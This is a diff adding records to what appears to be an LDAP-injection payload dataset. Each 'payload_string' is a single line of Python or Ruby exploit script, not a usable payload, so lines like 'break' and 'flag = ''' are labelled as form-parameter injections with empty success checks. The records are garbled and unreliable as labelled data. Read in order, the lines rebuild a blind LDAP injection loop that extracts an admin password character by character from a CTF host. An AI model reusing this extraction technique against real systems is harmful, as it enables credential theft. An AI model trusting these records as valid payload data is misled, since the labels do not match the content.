+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "print(\"[i] Looking for number \" + str(i))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37757",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "for char in alphabet:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37758",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "r = requests.get(\"http://ctf.web?action=dir&search=admin*)(password=\" + flag + char)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37759",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "if (\"TRUE CONDITION\" in r.text):",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37760",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "flag += char",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37761",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "print(\"[+] Flag: \" + flag)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37762",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "break",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37763",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "require 'net/http'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37764",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!\"$%=^[]:;'.split('')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37765",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "flag = ''",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37766",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "(0..50).each do |i|",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37767",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "puts(\"[i] Looking for number #{i}\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37768",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "alphabet.each do |char|",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37769",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "r = Net::HTTP.get(URI(\"http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}\"))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37770",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "if /TRUE CONDITION/.match?(r)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37771",
+    "vulnerability_category": "Injection (LDAP)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "puts(\"[+] Flag: #{flag}\")",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
